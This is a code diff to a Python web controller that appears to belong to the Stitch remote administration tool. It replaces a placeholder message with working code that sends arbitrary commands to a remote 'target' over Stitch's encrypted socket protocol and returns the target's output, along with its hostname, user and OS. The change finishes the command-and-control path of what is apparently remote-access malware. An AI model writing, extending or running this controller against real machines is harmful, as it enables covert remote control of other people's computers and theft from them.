@@ -7,6 +7,7 @@ import os
 import sys
 import json
 import secrets
+import socket
 import threading
 import time
 from datetime import datetime, timedelta
@@ -810,13 +811,8 @@ def execute_real_command(command, conn_id=None):
         return f"❌ Error executing command: {str(e)}"
 
 def execute_on_target(socket_conn, command, aes_key, target_ip):
-    """Execute command on target machine"""
+    """Execute command on target machine using real Stitch protocol"""
     try:
-        # Parse command
-        cmd_parts = command.split()
-        cmd_name = cmd_parts[0] if cmd_parts else command
-        cmd_args = ' '.join(cmd_parts[1:]) if len(cmd_parts) > 1 else ''
-        
         # Get target info from config
         import configparser
         config = configparser.ConfigParser()
@@ -831,32 +827,34 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
             target_hostname = target_ip
             target_user = 'Unknown'
         
-        # Create stitch_lib instance for this connection
-        # Note: This is simplified - in real implementation would need full setup
-        output = f"""
-🎯 Target: {target_hostname} ({target_ip})
+        output_header = f"""🎯 Target: {target_hostname} ({target_ip})
 👤 User: {target_user}
 💻 OS: {target_os}
 ⚡ Command: {command}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-✅ Command sent to target successfully.
-
-⚠️  IMPORTANT: For full interactive command execution with real-time output,
-   use the Terminal CLI. The web interface supports command dispatch but
-   interactive shells (cd, shell, etc.) work best in CLI mode.
-
-To execute in Terminal:
-1. Open Terminal tab
-2. Run: python3 main.py
-3. Type: shell {target_ip}
-4. Execute your commands interactively
-
-This ensures you get the full terminal experience with proper streaming output.
+OUTPUT:
 """
         
-        return output
+        # Send command to target using Stitch protocol
+        try:
+            # Use stitch_lib functions for encrypted communication
+            stitch_lib.st_send(socket_conn, command.encode('utf-8'), aes_key)
+            
+            # Receive response from target
+            response = stitch_lib.st_receive(socket_conn, aes_key, as_string=True)
+            
+            if response:
+                return output_header + response
+            else:
+                return output_header + "⚠️ No output returned from target (command may still have executed)"
+                
+        except socket.timeout:
+            return output_header + "⚠️ Command timed out - target may be slow or command is still executing"
+        except socket.error as e:
+            return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected."
+        except Exception as e:
+            return output_header + f"❌ Execution error: {str(e)}"
         
     except Exception as e:
         return f"❌ Error communicating with target: {str(e)}"
